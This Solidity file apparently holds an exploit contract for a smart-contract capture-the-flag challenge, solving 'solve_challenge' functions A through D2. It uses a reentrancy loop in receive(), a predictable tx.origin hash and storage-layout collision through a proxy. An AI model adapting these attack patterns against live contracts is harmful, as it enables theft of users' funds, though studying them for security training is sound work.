// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Ichallenge {
    function solve_challenge_A(bytes32 c__) external payable;

    function solve_challenge_B() external;

    function solve_challenge_C(address _newPrincipal) external;

    function get_C_Profit() external;

    function solve_challenge_D(address _proxy) external;

    function solve_challenge_D2() external;
}

contract hacker {
    uint counter = 1;
    address casualty;
    MSS_SS_SSM store;

    struct MSS_SS_SSM {
        uint8 offset__0;
        uint8 offset__1;
        uint8 offset__2;
        uint8 offset__3;
        uint8 offset__4;
        uint8 offset__5;
        uint8 offset__6;
        uint8 offset__7;
        uint64 offset2_8;
        uint64 offset2_9;
        uint16 __boom__;
        uint48 offset2_10;
    }

    constructor(address _casualty) {
        casualty = _casualty;
        Ichallenge(casualty).solve_challenge_C(
            0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38
        );
        Ichallenge(casualty).get_C_Profit();
        Ichallenge(casualty).solve_challenge_D(address(this));
    }

    function hackA() public {
        bytes32 c__ = keccak256(
            abi.encode("0x44\\0x33\\0x22\\0x11\\0x00", tx.origin)
        );
        uint value_ = (uint32(uint160(address(this))) & 0xffff) / 100;
        Ichallenge(casualty).solve_challenge_A{value: value_}(c__);
        Ichallenge(casualty).solve_challenge_D2();
        Ichallenge(casualty).solve_challenge_B();
    }

    function init(address _proxy) public {
        store.__boom__ = uint16(bytes2(bytes16(keccak256(abi.encode(_proxy)))));
    }

    function __expected__() external view returns (MSS_SS_SSM memory) {
        return store;
    }

    fallback() external payable {}

    receive() external payable {
        counter++;
        if (counter < 10) {
            Ichallenge(casualty).solve_challenge_B();
        }
    }
}
